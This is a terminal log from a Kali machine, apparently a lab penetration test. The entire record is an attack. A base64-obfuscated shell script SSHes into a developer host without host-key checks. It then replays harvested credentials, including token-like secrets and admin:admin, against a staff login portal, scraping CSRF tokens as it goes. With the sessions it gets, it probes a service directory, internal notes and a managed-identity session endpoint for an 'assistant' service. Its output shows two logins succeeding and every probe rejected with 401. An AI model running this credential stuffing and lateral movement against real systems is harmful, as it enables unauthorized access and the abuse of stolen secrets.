@@ -1,0 +1,53 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p10.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkI9aHR0cHM6Ly9zdGFmZi5rZXBsZXJvcHMudGVzdAp0cnlfbG9naW4oKXsKICB1PSIkMSI7IHA9IiQyIjsgamFyPSIkMyIKICBybSAtZiAiJGphciIKICBjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWMgIiRqYXIiIC1vIC90bXAvbGcuaHRtbCAiJEIvbG9naW4iCiAgY3NyZj0kKGdyZXAgLW9FICduYW1lPSJjc3JmX3Rva2VuIiB2YWx1ZT0iW2EtZjAtOV0rIicgL3RtcC9sZy5odG1sIHwgZ3JlcCAtb0UgJ1thLWYwLTldezMyLH0nIHwgaGVhZCAtMSkKICBjb2RlPSQoY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICIkamFyIiAtYyAiJGphciIgLW8gL3RtcC9sZzIuaHRtbCAtdyAnJXtodHRwX2NvZGV9ICV7cmVkaXJlY3RfdXJsfScgXAogICAgLS1kYXRhLXVybGVuY29kZSAidXNlcm5hbWU9JHUiIC0tZGF0YS11cmxlbmNvZGUgInBhc3N3b3JkPSRwIiAtLWRhdGEtdXJsZW5jb2RlICJjc3JmX3Rva2VuPSRjc3JmIiAiJEIvbG9naW4vY2hlY2siKQogIGVjaG8gIkxPR0lOWyR1XSBjc3JmPSR7Y3NyZjowOjh9IC0+ICRjb2RlIgogIGN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAiJGphciIgLW8gL2Rldi9udWxsIC13ICdhZnRlci1sb2dpbiAvbG9naW46ICV7aHR0cF9jb2RlfSByZWRpcmVjdD0le3JlZGlyZWN0X3VybH1cbicgIiRCL2xvZ2luIgogIGN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAiJGphciIgLXcgJ1xuc2VydmljZS1kaXJlY3RvcnlbJXtodHRwX2NvZGV9XVxuJyAiJEIvYXBpL3NlcnZpY2UtZGlyZWN0b3J5IiB8IGhlYWQgLWMgMTUwMDsgZWNobwp9CmZvciBjcmVkIGluICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiAicm93YW4uaXRvOmZpZWxkbGluay1kZXYtMjg0MSIgIm1heWEucmFuc2NvbWJlOnNXUWEzMTA4NUZUUWVrWmhIVHhVeWZfOUUxbWFycTB1cjhXTkNLbVR0bmsiICJhZG1pbjphZG1pbiI7IGRvCiAgdT0ke2NyZWQlJToqfTsgcD0ke2NyZWQjKjp9CiAgdHJ5X2xvZ2luICIkdSIgIiRwIiAvdG1wL2tiXyR1Lmphcgpkb25lCmVjaG8gIiMjIyMgcHJvYmUgbm90ZXMgd2l0aCBhbnkgYXV0aGVudGljYXRlZCBqYXIiCmZvciBqYXIgaW4gL3RtcC9rYl8qLmphcjsgZG8KICBlY2hvICItLS0gJGphciIKICBjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgIiRqYXIiIC13ICdcblsle2h0dHBfY29kZX1dXG4nICIkQi9hcGkvbm90ZXMvRVNDLVNVUC0yODQxLVIzIiB8IGhlYWQgLWMgNDAwCiAgY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICIkamFyIiAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7InNlcnZpY2UiOiJhc3Npc3RhbnQifScgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRCL2FwaS9tYW5hZ2VkLWlkZW50aXRpZXMvYXNzaXN0YW50L3Nlc3Npb24iIHwgaGVhZCAtYyA0MDAKZG9uZQpJTk5FUgplY2hvIERPTkVfTUFSS18kUkFORE9NCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p10.sh; bash /tmp/p10.sh; echo DONEMARK_1795201915317$((6*7))
+LOGIN[rowan.ito] csrf=8abda075 -> 302 https://staff.keplerops.test/dashboard
+after-login /login: 302 redirect=https://staff.keplerops.test/dashboard
+{"error":"unauthorized"}
+
+service-directory[401]
+
+LOGIN[rowan.ito] csrf=825ca31e -> 200 
+after-login /login: 200 redirect=
+{"error":"unauthorized"}
+
+service-directory[401]
+
+LOGIN[maya.ranscombe] csrf=64267e21 -> 302 https://staff.keplerops.test/dashboard
+after-login /login: 302 redirect=https://staff.keplerops.test/dashboard
+{"error":"unauthorized"}
+
+service-directory[401]
+
+LOGIN[admin] csrf=1bdfcaaf -> 200 
+after-login /login: 200 redirect=
+{"error":"unauthorized"}
+
+service-directory[401]
+
+#### probe notes with any authenticated jar
+--- /tmp/kb_admin.jar
+{"error":"unauthorized"}
+
+[401]
+
+[401]
+--- /tmp/kb_maya.ranscombe.jar
+{"error":"unauthorized"}
+
+[401]
+
+[401]
+--- /tmp/kb_rowan.ito.jar
+{"error":"unauthorized"}
+
+[401]
+
+[401]
+DONE_MARK_16635
